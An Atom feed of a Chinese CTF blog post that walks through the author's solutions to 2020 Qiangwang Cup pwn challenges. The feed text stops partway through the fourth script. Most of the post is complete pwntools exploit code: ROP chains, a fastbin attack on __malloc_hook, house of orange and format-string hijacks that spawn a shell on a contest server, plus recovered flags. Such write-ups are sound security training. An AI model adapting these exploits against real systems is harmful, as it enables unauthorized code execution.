<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-09-01T12:47:37.646Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020强网杯pwn wp</title>
    <link href="https://nocbtm.github.io/2020/08/30/2020%E5%BC%BA%E7%BD%91%E6%9D%AFpwn-wp/"/>
    <id>https://nocbtm.github.io/2020/08/30/2020强网杯pwn-wp/</id>
    <published>2020-08-30T11:25:19.000Z</published>
    <updated>2020-09-01T12:47:37.646Z</updated>
    
    <content type="html"><![CDATA[<p>ctf真是秃头爆肝游戏，肝了两天出了六道pwn，pwn题真的太多了，做到不想做。</p><p>最终48名，尽力了，没有进线下。</p><p><img alt="img" data-src="https://nocbtm.github.io/imgs/ISEE3DP466PG13.png" class="lozad"></p><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><p>leave_message 函数有栈溢出，先构造rop链泄漏libc_addr，然后再次溢出，构造systme(“/bin/sh”)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">pwn_name = <span class="string">"babymessage"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>, <span class="number">21342</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"name:"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"message:"</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice"</span>, <span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">256</span>) + <span class="string">"\n"</span>)</span><br><span class="line">msg(<span class="string">"a"</span> * <span class="number">8</span> + p64(<span class="number">0x6010D0</span> + <span class="number">4</span>) + <span class="string">"b"</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(<span class="number">0x601038</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac1</span>) + p64(<span class="number">0x601038</span>) * <span class="number">2</span> +  p64(<span class="number">0x400670</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0x40080A</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"message:"</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">read_libc = u64(p.recv(<span class="number">6</span>) + <span class="string">"\x00\x00"</span>)</span><br><span class="line">log.success(<span class="string">"0x%x"</span> %read_libc)</span><br><span class="line"></span><br><span class="line">libc_base = read_libc - <span class="number">0x110180</span></span><br><span class="line">log.success(<span class="string">"0x%x"</span> %libc_base)</span><br><span class="line">binsh = libc_base + <span class="number">0x1B40FA</span></span><br><span class="line">system_ = libc_base + <span class="number">0x4f4e0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(binsh) + p64(system_)</span><br><span class="line">p.sendafter(<span class="string">"message:"</span>, payload + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babynotes"><a href="#babynotes" class="headerlink" title="babynotes"></a>babynotes</h2><p>free的时候idx可以输入负数，register时刚好输入的age就在chunk_list上面，先泄露出libc_addr和堆的地址，然后更新age为堆块的地址，即可造成堆块复用，然后用fatsbin attack 攻击<code>__malloc_hook</code>为onegadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"babynotes"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>, <span class="number">43121</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">    p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name,motto,age)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"name: \n"</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">"motto: \n"</span>,motto)</span><br><span class="line">    p.sendlineafter(<span class="string">"age: \n"</span>,str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">register(<span class="string">"n"</span>*<span class="number">0x17</span>,<span class="string">"a"</span>*<span class="number">0x20</span>,<span class="number">0x66666666</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x3c4b78</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=leak<span class="number">-0x230</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line">register(<span class="string">"n"</span>*<span class="number">0x17</span>,<span class="string">"a"</span>*<span class="number">0x20</span>,heap_addr+<span class="number">0x1d0</span>)</span><br><span class="line">free(<span class="number">-3</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">"__malloc_hook"</span>]<span class="number">-0x23</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one[<span class="number">3</span>]+libc.address))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;df8791b3e5b410506265d92cd8396e59&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a>Just_a_Galgame</h2><p>edit的时候没有检查idx，且有溢出，溢出修改top_chunk的size,需要满足内存页对齐，house of orange 攻击，会有free过后的unsorted bin ，再次申请小堆块，可泄漏libc_addr, 5功能可写入<code>__malloc_hook-0x60</code>的地址进行攻击，然后edit写入onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Just_a_Galgame"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">"123.56.170.202"</span>, <span class="number">52114</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span>  <span class="comment">#0x68</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,meg)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;"</span>,meg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">()</span>:</span> <span class="comment">#0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd41</span>))</span><br><span class="line"></span><br><span class="line">add2()</span><br><span class="line">add()</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ec2a0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3ebc30</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.send(p64(malloc_hook<span class="number">-0x60</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,p64(one[<span class="number">1</span>]+libc_base))</span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;145f2d9125917286c21df2bf470a8a81&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><p>sub_1212 里面很明显的格式化字符串，先泄露出libc_addr和ebp_addr，然后修改mian函数返回地址为onegadget，最终修改，sub_1212函数返回地址为main函数里面的leave ret，即可跳出while循环，劫持程序执行流为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Siri"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>,<span class="number">12124</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">    p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span 